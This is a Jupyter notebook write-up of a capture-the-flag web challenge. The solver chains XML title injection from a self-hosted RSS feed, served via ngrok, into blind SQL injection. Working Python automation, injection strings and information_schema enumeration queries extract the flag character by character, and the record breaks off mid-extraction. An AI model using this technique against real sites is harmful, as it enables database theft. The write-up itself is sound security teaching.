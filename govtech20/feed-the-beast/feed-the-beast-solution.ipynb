{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Feed the Beast\n",
    "\n",
    "> 2000 | WEB\n",
    "> \n",
    "> You got into COViD's admin portal! However, it appears that certain information is still hidden. Time to hunt for clues!\n",
    ">\n",
    "> [Admin Portal](http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41041/)\n",
    "\n",
    "Writeup by [@4yn](https://github.com/4yn)\n",
    "\n",
    "Web 2000, my team was the only solve in our category 😲🎉. This challenge involves blind SQL injection with an interesting vector and several gotchas that can block you from getting flag.\n",
    "\n",
    "[A tl;dr is available below](#Summary)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## What we have to work with"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Opening the web portal, we see a graph plotting some odd data, but also two more sub-pages to view.\n",
    "\n",
    "![Web main](files/images/web-main.png)\n",
    "\n",
    "The first interesting page is called \"Feeds\" and seems to be a table of RSS feeds. Sure enough the links do point to some [real](https://cyware.com/allnews/feed) [RSS](https://threatpost.com/feed/) [feeds](https://nakedsecurity.sophos.com/feed/) that are serving real news feeds and what not. There also seems to be a form to submit links to new feeds to be added.\n",
    "\n",
    "![Web feed](files/images/web-feed.png)\n",
    "\n",
    "Finally, there is the \"Keys\" page which has a table of some names, owners and what looks like hexadecimal \"keys\". Some of them are redacted and shows the text \"MASTER KEY -- LOCAL ONLY\". Chances are our flag is in there and we need to find a way to get the redacted keys. That and, why is everything displayed in a table? Are we getting into SQL territory?\n",
    "\n",
    "![Web keys](files/images/web-keys.png)\n",
    "\n",
    "As a final bit of recon, we can take a look at the headers of the responses to the web server. We can see that the server is running on Express, a javascript webserver.\n",
    "\n",
    "![Web hedaers](files/images/web-headers.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exploring feed submission"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If we try to re-submit a link to a preexisting feed, we get a JSON error in reply.\n",
    "\n",
    "**Form data**\n",
    "```\n",
    "url: https://cyware.com/allnews/feed\n",
    "```\n",
    "\n",
    "![Feed exists](files/images/feed-exists.png)\n",
    "\n",
    "Looks like its done some checks against the feeds that are currently in the list and prevents any feeds with duplicate titles from being added, giving this error message. While this check could be done inside javascript, it might be done inside a database using SQL as well.\n",
    "\n",
    "If we submit a link to a different RSS feed, such as one from [The Straits Times](https://www.straitstimes.com/RSS-Feeds), we get a error toast saying that adding new feeds is not allowed.\n",
    "\n",
    "**Form data**\n",
    "```\n",
    "url: https://www.straitstimes.com/news/world/rss.xml\n",
    "```\n",
    "![Feed no new](files/images/feed-no-new.png)\n",
    "\n",
    "Hmm, that looks a bit fishy. If a feed doesn't exist, the server echos back the title field of the feed. We can confirm this by opening up the feed ourselves.\n",
    "\n",
    "![Feed st title](files/images/feed-st-title.png)\n",
    "\n",
    "Yep, it looks like the contents of `<title>` was printed to us. Is this a possible vector for XSS? Well not really, there isn't any indication that there is a admin bot to run XSS on nor is there a way to show this text to other users because this error is only shown to whoever submitted the form.\n",
    "\n",
    "What if we try a [RSS generator that prints dummy text](https://lorem-rss.herokuapp.com/)?\n",
    "\n",
    "**Form data**\n",
    "```\n",
    "url: https://lorem-rss.herokuapp.com/feed\n",
    "```\n",
    "![Feed object](files/images/feed-object.png)\n",
    "\n",
    "HAHA, good ol' `[Object object]`. Looks like when the server tried to stringify the response it parsed the contents of the `<title>` as some other XML element instead of a raw string. When the XML element was stringified it would then be converted into `[Object object]` by default. Sure enough, if we load up the feed ourselves we see that the `<title>` tag actually is a `<![CDATA[]]>` tag and that was stringified into our error message here.\n",
    "\n",
    "![Feed cdata](files/images/feed-cdata.png)\n",
    "\n",
    "Across the entire web portal, this seems to be the only way we can meaningfully interact with the service so far. Since we know the server seems to be processing the `<title>` field of any XML we give it, let's see what we can do with different titles."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exploiting XML Injection"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "To have better control over the contents of an RSS feed, we can serve our own RSS feed from a local webserver like [`flask`](https://flask.palletsprojects.com/en/1.1.x/). Additionally, we can use [`ngrok`](https://ngrok.com/) to forward our local webserver to a public domain name, after that we can submit this `ngrok` URL to the flag server so it loads XML from our webserver.\n",
    "\n",
    "The webserver can be found at at [`server.py`](files/server.py). Right now, we've set up the endpoint `/static` so that it serves whatever file I have at [`static.xml`](files/static.xml).\n",
    "\n",
    "Let's see if our custom title is working, we'll put this in the XML and submit our public link to the challenge server:\n",
    "\n",
    "**ngrok**\n",
    "```bash\n",
    "$ ngrok http 3000\n",
    "...\n",
    "Forwarding          http://261da9601892.ngrok.io -> http://localhost:3000\n",
    "```\n",
    "\n",
    "**`server.py` code**\n",
    "```python\n",
    "@app.route('/static')\n",
    "def static_feed():\n",
    "  return app.send_static_file('static.xml')\n",
    "```\n",
    "\n",
    "**Flask server run**\n",
    "```bash\n",
    "$ ./server.py\n",
    " * Serving Flask app \"server\" (lazy loading)\n",
    " ...\n",
    " * Running on http://127.0.0.1:3000/ (Press CTRL+C to quit)\n",
    " ...\n",
    "```\n",
    "\n",
    "**`static.xml` contents**\n",
    "```xml\n",
    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n",
    "<rss xmlns:atom=\"http://www.w3.org/2005/Atom\" version=\"2.0\">\n",
    "  <channel>\n",
    "    <title>My own title!</title>\n",
    "    <!--- more stuff here -->\n",
    "  </channel>\n",
    "</rss>\n",
    "...\n",
    "```\n",
    "\n",
    "**Form data**\n",
    "```\n",
    "url: http://261da9601892.ngrok.io/static\n",
    "```\n",
    "\n",
    "![Inject plain](files/images/inject-plain.png)\n",
    "\n",
    "Looks like our title does get echoed inside! What happens if we try to put some SQL injection inside?\n",
    "\n",
    "**`static.xml` contents** (just the `<title>` tag from now on)\n",
    "```xml\n",
    "<title>' OR '1'='1</title>\n",
    "```\n",
    "\n",
    "**Form data**\n",
    "```\n",
    "url: http://261da9601892.ngrok.io/static\n",
    "```\n",
    "\n",
    "![Inject stripped apos](files/images/inject-stripped-apos.png)\n",
    "\n",
    "Well, we didn't get a injection straight away, but notice our apostrophes seems to have disappeared. What gives? Turns out, there are [five characters that need to be escaped in valid XML](https://stackoverflow.com/a/1091953/12843211), specifically the following need to be escaped and replaced with [some counterpart](https://docs.oracle.com/cd/A97335_02/apps.102/bc4j/developing_bc_projects/obcCustomXml.htm):\n",
    "- apostrophe `'`\n",
    "- quotes `\"`\n",
    "- ampersand `&`\n",
    "- less than `<`; and \n",
    "- greater than `>`\n",
    "\n",
    "Let's replace the quotes in our xml with its escape code `&#39;` and see what happens.\n",
    "\n",
    "**`static.xml` contents** (just the `<title>` tag from now on)\n",
    "```xml\n",
    "<title>&#39; OR &#39;1&#39;=&#39;1</title>\n",
    "```\n",
    "\n",
    "**Form data**\n",
    "```\n",
    "url: http://261da9601892.ngrok.io/static\n",
    "```\n",
    "\n",
    "![Inject positive](files/images/inject-positive.png)\n",
    "\n",
    "Hey, looks like it worked! What happens if we give it something falsy?\n",
    "\n",
    "**`static.xml` contents** (just the `<title>` tag from now on)\n",
    "```xml\n",
    "<title>&#39; OR &#39;1&#39;=&#39;0</title>\n",
    "```\n",
    "\n",
    "**Form data**\n",
    "```\n",
    "url: http://261da9601892.ngrok.io/static\n",
    "```\n",
    "\n",
    "![Inject negative](files/images/inject-negative.png)\n",
    "\n",
    "Yep, we now have a working [blind SQL injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection) on the server. If the query we inject in is truthy and returns one or more rows, we are presented with a \"title already exists\" error. If the query we inject is falsy and results in no rows, we are represented with a \"no new feeds allowed\" error.\n",
    "\n",
    "With this new info, we can try to leak data from the database by carefully crafting different SQL injections and observing what statements return with what error messages, therefore fnding out the truthiness or falsiness of the injection and possibly leaking the flag."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Automating SQLi"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Editing `staticfeed.xml` every time we want to change the feed title is tedious, so I updated `server.py` to dynamically generate a feed using the HTTP search query parameters to determine the contents of `<title>`. \n",
    "\n",
    "**`server.py`**\n",
    "```python\n",
    "@app.route('/')\n",
    "def dynamic_feed():\n",
    "  data = {\n",
    "    'title': request.args.get('title')\n",
    "  }\n",
    "  return Response(render_template('feed.xml', **data), mimetype='application/xml')\n",
    "```\n",
    "\n",
    "**`feed.xml` template**\n",
    "```xml\n",
    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n",
    "<rss xmlns:atom=\"http://www.w3.org/2005/Atom\" version=\"2.0\">\n",
    "  <channel>\n",
    "    <!--- jjinja template! -->\n",
    "    <title>{{title | default(\"Title\", true)}}</title>\n",
    "    <!--- more stuff here -->\n",
    "  </channel>\n",
    "</rss>\n",
    "```\n",
    "\n",
    "This way, all we need to do to change the feed title is to send a different link to the challenge server:\n",
    "\n",
    "![Automate demo](files/images/automate-demo.png)\n",
    "\n",
    "And the best thing is, the `jjinja` template helps us escape any XML characters that need to be escaped!\n",
    "\n",
    "![Automate escape](files/images/automate-escape.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now, we can set up our python script to directly query the challenge server intead of us filling in the form each time."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Challenge Server Interaction Helper"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "_By the way, our ngrok and `server.py` are still running._\n",
    "\n",
    "We want to make a helper function that will prepare a URL with a special search parameter `/?title=<title_text>` and then submit that URL to the challenge server. The challenge server then loads the feed from our local weberver, which uses the parameter from earlier to customise the text inside `<title>` of the feed. On loading the customised XML file, the challenge server may then run a SQL injection that was contained inside the `<title>` text and send different error codes back to our script here."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import time # For delay\n",
    "import urllib # For URL encoding any special characters in the query string\n",
    "import requests # For making HTTP requests to the challenge server\n",
    "from bs4 import BeautifulSoup # For extracting the error message in the HTML response"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "challenge_url = 'http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41041/feed'\n",
    "feed_url = 'http://261da9601892.ngrok.io/'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "def query_challenge(title='Feed Title'):\n",
    "    # Prevent ngrok rate limit\n",
    "    time.sleep(1)\n",
    "    \n",
    "    # Generate the URL to be submitted to the challenge server\n",
    "    full_url = feed_url + '?' + urllib.parse.urlencode({\n",
    "        'title': title\n",
    "    })\n",
    "    \n",
    "    # Query the challenge server\n",
    "    res = requests.post(\n",
    "        challenge_url,\n",
    "        data={\n",
    "            'url': full_url\n",
    "        }\n",
    "    )\n",
    "    \n",
    "    if 'text/html' in res.headers['Content-Type']:\n",
    "        # Query returned 0 rows -> \"no new feeds allowed\" error\n",
    "        \n",
    "        # Find the exact error message using bs4\n",
    "        soup = BeautifulSoup(res.content, 'html.parser')\n",
    "        alert = soup.find(class_=[\"alert\", \"alert-danger\"]).string\n",
    "        # Our injection was falsy\n",
    "        return (False, alert, res)\n",
    "    \n",
    "    elif 'application/json' in res.headers['Content-Type']:\n",
    "        # Get json content of response\n",
    "        res_json = res.json()\n",
    "        \n",
    "        if 'error' in res_json:\n",
    "            if res_json['error'] == 'Feed with same title already exists!':\n",
    "                # Query returned 1 or more rows -> \"title already exists\" error\n",
    "                # Our injection was truthy\n",
    "                return (True, res_json['error'], res)\n",
    "            \n",
    "            elif res_json['error'] == 'Failed to retrieve feed!':\n",
    "                # Challenge server couldn't reach our feed\n",
    "                # Possibly got rate limited by ngrok\n",
    "                raise RuntimeError(res, 'Failed to retrieve feed, check the server / ngrok')\n",
    "                \n",
    "    # Unknown error occurred\n",
    "    return(None, \"error\", res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now, we can call `query_challenge()` to see what happens if we put some text inside the `<title>` of the RSS feed. Let's test the helper function out."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(False, 'Failed to add What How; no new feeds allowed!', <Response [200]>)"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# This title shouldn't exist inside the challenge server, we should get a no new feeds allowed error\n",
    "query_challenge(\"What How\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(True, 'Feed with same title already exists!', <Response [500]>)"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# This title does exist inside the challenge server, we should get a title already exists error\n",
    "query_challenge(\"Cyware News - Latest Cyber News\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(True, 'Feed with same title already exists!', <Response [500]>)"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# This SQL injection is truthy and will return all rows, we should get a title already exists error\n",
    "query_challenge(\"' OR '1'='1\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(False, \"Failed to add ' OR '1'='0; no new feeds allowed!\", <Response [200]>)"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# This SQL injection is falsy and will return 0 rows, we should get a no new feeds allowed error\n",
    "query_challenge(\"' OR '1'='0\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Nice, we now have an easier way to query the server! Let's start to leak data."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Blind SQL Schema Enumeration"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Considering that the web page earlier had different pages for \"Feeds\" and \"Keys\", it's safe to assume that the data is stored in different tables. We can't just keep stacking `WHERE` statements inside the injection because that will only look at data related to \"Feeds\". Instead we need to begin querying against the table containing \"Keys\". Before we can do that, we need to find exactly what are the schema and table names used to store the respective data. One way to do this is through [introspection of `information_schema`](https://www.sqlinjection.net/table-names/). \n",
    "\n",
    "We can nest a subquery inside the SQLi from earlier. Depending on how many rows the subquery returned, we can return a truthy or falsy response. Using this, we can check if rows exist in the tables of `information_schema` specific names."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(True, 'Feed with same title already exists!', <Response [500]>)"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Check if there are any columns at all, should return true\n",
    "query_challenge(\n",
    "    \"' OR (SELECT COUNT(*) FROM information_schema.columns) != 0 AND '1'='1\"\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(False,\n",
       " \"Failed to add ' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_name LIKE 'baba') != 0 AND '1'='1; no new feeds allowed!\",\n",
       " <Response [200]>)"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Check if there is a table name called 'baba', should return false\n",
    "query_challenge(\n",
    "    \"' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_name LIKE 'baba') != 0 AND '1'='1\"\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(True, 'Feed with same title already exists!', <Response [500]>)"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Check if there is a table name called 'keys'\n",
    "query_challenge(\n",
    "    \"' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_name LIKE 'keys') != 0 AND '1'='1\"\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now we know there is a table called `keys`!\n",
    "\n",
    "To make things cleaner, we can wrap the subquery in another function:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "def query_challenge_union(table, condition=\"'1'='1'\"):\n",
    "    return query_challenge(f\"' OR (SELECT COUNT(*) FROM {table} WHERE {condition}) != 0 AND '1'='1\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(True, 'Feed with same title already exists!', <Response [500]>)"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# There, looks cleaner!\n",
    "query_challenge_union(\"information_schema.columns\", \"table_name LIKE 'keys'\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The next thing we need to find out is the name of the table schema, as we will need that to query the `keys` table later on.\n",
    "\n",
    "Using some educated guesses, you can try names like `data`, `challenge`, `feed` or others, and eventually we found that the schema was named `admin`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(False,\n",
       " \"Failed to add ' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_name LIKE 'keys' AND table_schema LIKE 'challenge') != 0 AND '1'='1; no new feeds allowed!\",\n",
       " <Response [200]>)"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# No schema called \"challenge\" with table name \"keys\"\n",
    "query_challenge_union(\"information_schema.columns\", \"table_name LIKE 'keys' AND table_schema LIKE 'challenge'\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(True, 'Feed with same title already exists!', <Response [500]>)"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Found schema called \"admin\" with table name \"keys\"\n",
    "query_challenge_union(\"information_schema.columns\", \"table_name LIKE 'keys' AND table_schema LIKE 'admin'\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Next, we should find out the names of columns and their datatypes inside the `keys` table:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(False,\n",
       " \"Failed to add ' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_name LIKE 'keys' AND table_schema LIKE 'admin' AND column_name LIKE 'secret') != 0 AND '1'='1; no new feeds allowed!\",\n",
       " <Response [200]>)"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# No column called \"secret\" in \"admin.keys\"\n",
    "query_challenge_union(\n",
    "    \"information_schema.columns\",\n",
    "    \"table_name LIKE 'keys' AND table_schema LIKE 'admin' AND column_name LIKE 'secret'\"\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(True, 'Feed with same title already exists!', <Response [500]>)"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Found column called \"key\" in \"admin.keys\"\n",
    "query_challenge_union(\n",
    "    \"information_schema.columns\",\n",
    "    \"table_name LIKE 'keys' AND table_schema LIKE 'admin' AND column_name LIKE 'key'\"\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(False,\n",
       " \"Failed to add ' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_name LIKE 'keys' AND table_schema LIKE 'admin' AND column_name LIKE 'key' AND data_type LIKE 'TEXT') != 0 AND '1'='1; no new feeds allowed!\",\n",
       " <Response [200]>)"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Column \"key\" in \"admin.keys\" is not of type TEXT\n",
    "query_challenge_union(\n",
    "    \"information_schema.columns\",\n",
    "    \"table_name LIKE 'keys' AND table_schema LIKE 'admin' AND column_name LIKE 'key' AND data_type LIKE 'TEXT'\"\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(True, 'Feed with same title already exists!', <Response [500]>)"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Column \"key\" in \"admin.keys\" is type VARCHAR\n",
    "query_challenge_union(\n",
    "    \"information_schema.columns\",\n",
    "    \"table_name LIKE 'keys' AND table_schema LIKE 'admin' AND column_name LIKE 'key' AND data_type LIKE 'VARCHAR'\"\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "So now we know that we have a table `admin.keys` with an interesting column `key`. The flag probably is in there, seeing as it was the main redacted data on the challenge site.\n",
    "\n",
    "We can also find out more about other columns in the database, but this won't be as necessary for the rest of the challenge."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(True, 'Feed with same title already exists!', <Response [500]>)"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# \"admin.keys\" contains \"name\" that is type VARCHAR\n",
    "query_challenge_union(\n",
    "    \"information_schema.columns\",\n",
    "    \"table_name LIKE 'keys' AND table_schema LIKE 'admin' AND column_name LIKE 'name' AND data_type LIKE 'VARCHAR'\"\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(True, 'Feed with same title already exists!', <Response [500]>)"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# \"admin.feeds\" table exists\n",
    "# \"admin.feeds\" contains \"title\" that is type VARCHAR\n",
    "query_challenge_union(\n",
    "    \"information_schema.columns\",\n",
    "    \"table_name LIKE 'feeds' AND table_schema LIKE 'admin' AND column_name LIKE 'title' AND data_type LIKE 'VARCHAR'\"\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(True, 'Feed with same title already exists!', <Response [500]>)"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# \"admin.feeds\" contains \"description\" that is type TEXT\n",
    "query_challenge_union(\n",
    "    \"information_schema.columns\",\n",
    "    \"table_name LIKE 'feeds' AND table_schema LIKE 'admin' AND column_name LIKE 'description' AND data_type LIKE 'TEXT'\"\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Blind SQL Data Leaking"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We now know there is a table `admin.keys`, so let's see if there is a flag in there to leak."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(None, 'error', <Response [500]>)"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "query_challenge_union(\"keys\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(None, 'error', <Response [500]>)"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "query_challenge_union(\"admin.keys\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'{\"error\":\"Failed!\"}'"
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "res = query_challenge_union(\"admin.keys\")\n",
    "res[2].text"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Uh oh, looks like if we try to query `admin.keys` it seems to give us a server error, instead of the expected errors we identified earlier. After some more digging, we found that our enumeration just now was _case insensitive_. The table name was actually `Keys` with a caiptal `K`. It seems that the `LIKE` filter we used earlier is configured to give case insensitive comparisons. We can confirm this by comparing behavior to the `=` operator."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "LIKE operator\n",
      "(True, 'Feed with same title already exists!', <Response [500]>)\n",
      "(True, 'Feed with same title already exists!', <Response [500]>)\n",
      "= operator\n",
      "(True, 'Feed with same title already exists!', <Response [500]>)\n",
      "(False, \"Failed to add ' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_name = 'keys') != 0 AND '1'='1; no new feeds allowed!\", <Response [200]>)\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "[None, None, None, None, None, None]"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "[\n",
    "    print(i)\n",
    "    for i in\n",
    "    [\n",
    "        \"LIKE operator\",\n",
    "        query_challenge_union(\"information_schema.columns\", \"table_name LIKE 'Keys'\"),\n",
    "        query_challenge_union(\"information_schema.columns\", \"table_name LIKE 'keys'\"),\n",
    "        \"= operator\",\n",
    "        query_challenge_union(\"information_schema.columns\", \"table_name = 'Keys'\"),\n",
    "        query_challenge_union(\"information_schema.columns\", \"table_name = 'keys'\")\n",
    "    ]\n",
    "]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Hmm, that might be an issue when we leak the flag later if the flag is case sensitive. Anyways, let's see what inside the `admin.Keys` table."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(True, 'Feed with same title already exists!', <Response [500]>)"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# There are rows inside \"admin.Keys\"\n",
    "query_challenge_union(\"admin.Keys\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(True, 'Feed with same title already exists!', <Response [500]>)"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# There is one key that begins with \"govtech-csg{\"!!!!\n",
    "query_challenge_union(\n",
    "    \"admin.Keys\",\n",
    "    \"Keys.key LIKE 'govtech-csg{%'\"\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Bingo, there's our flag.\n",
    "\n",
    "To get pass the case insensitive `LIKE`, we can check the contents of the key one character by one character, converting them with the `ASCII()` operator to force a case-sensitive comparison. Specifically, we use a query that looks like:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(True, 'Feed with same title already exists!', <Response [500]>)"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# 1st character of flag is 'g'\n",
    "query_challenge_union(\n",
    "    \"admin.Keys\",\n",
    "    \"Keys.key LIKE 'govtech-csg{%' AND ASCII(RIGHT(LEFT(Keys.key, 1), 1)) = ASCII('g')\"\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Let's break down the SQLi:\n",
    "- `Keys.key LIKE 'govtech-csg{%'` filters all keys to only the key that looks like a flag\n",
    "- `RIGHT(LEFT(Keys.key, X), 1))` picks the X-th character (1-indexed) of the key\n",
    "- `ASCII(...)` converts the Xth character to its respective ASCII code\n",
    "- `ASCII(...) = ASCII(Y)` compares the X-th character's ASCII code to the ascii code of `Y` (or any other character we use)\n",
    "\n",
    "We can double check that our comparison works by testing against parts of the flag that we already know."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(False,\n",
       " \"Failed to add ' OR (SELECT COUNT(*) FROM admin.Keys WHERE Keys.key LIKE 'govtech-csg{%' AND ASCII(RIGHT(LEFT(Keys.key, 2), 1)) = ASCII('O')) != 0 AND '1'='1; no new feeds allowed!\",\n",
       " <Response [200]>)"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# 2nd character of flag is NOT (capital) 'O', should return false\n",
    "query_challenge_union(\n",
    "    \"admin.Keys\",\n",
    "    \"Keys.key LIKE 'govtech-csg{%' AND ASCII(RIGHT(LEFT(Keys.key, 2), 1)) = ASCII('O')\"\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
